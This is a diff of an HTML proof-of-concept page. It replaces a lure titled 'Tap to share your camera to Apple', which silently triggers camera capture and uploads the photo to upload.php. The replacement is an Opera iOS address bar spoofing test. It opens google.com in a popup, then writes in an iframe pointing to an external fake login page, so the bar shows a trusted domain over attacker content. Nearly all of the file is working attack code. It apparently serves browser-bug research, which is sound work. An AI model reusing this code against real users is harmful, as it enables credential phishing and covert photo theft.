@@ -1,62 +1,47 @@
-
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Address Bar Spoofing PoC</title>
 <style>
-    h1 {
-        margin: 1em;
-    }
-
-    a {
-        position: absolute;
-        top: 0;
-        left: 0;
-        right: 0;
-        bottom: 0;
-    }
-
-    input {
-        display: none;
-    }
-
-    img {
-        width: 100%;
-    }
+body { font-family: Arial; text-align:center; margin-top:80px; }
+iframe { width:90%; height:80vh; border:1px solid #ccc; }
+.note { color:red; font-size:13px; margin-bottom:10px; }
 </style>
 
-<h1>Tap to share your camera to Apple</h1>
-
-<input id="fileSelect" type="file" accept="image/*" capture="camera" style="display:none;" />
-
-<img id="img" src="">
-<a id="link" href="https://google.com" target="_blank">Tap to open camera</a>
-
 <script>
-    document.getElementById('link').onclick = () => {
-        setTimeout(() => {
-            document.getElementById('fileSelect').click();
-        }, 600);
-    };
+function go() {
+    // Open trusted origin
+   var win = window.open('https://google.com:90');
 
-    document.getElementById('fileSelect').onchange = (event) => {
-        const file = event.target.files[0];
-        if (file) {
-            const img = document.getElementById('img');
-            img.src = URL.createObjectURL(file);
+    if (!win) {
+        alert("Popup blocked");
+        return;
+    }
 
-            const formData = new FormData();
-            formData.append('file', file);
+    setTimeout(function () {
+        try {
+            // Replace document with attacker content (iframe only)
+            win.document.open();
+            win.document.write(`
+                <p class="note">
+                    Demo: Address bar shows google.com, but content below is attacker-controlled.
+                </p>
 
-            fetch('upload.php', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => response.text())
-            .then(result => {
-                console.log('Success:', result);
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
+                <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
+            `);
+            win.document.close();
+
+        } catch (e) {
+            console.log("Blocked:", e);
         }
-    };
+    }, 3000);
+}
 </script>
+</head>
+
+<body>
+<h2>opera iOS Address Bar Spoofing Test</h2>
+<button onclick="go()">Start Test</button>
+</body>
+</html>
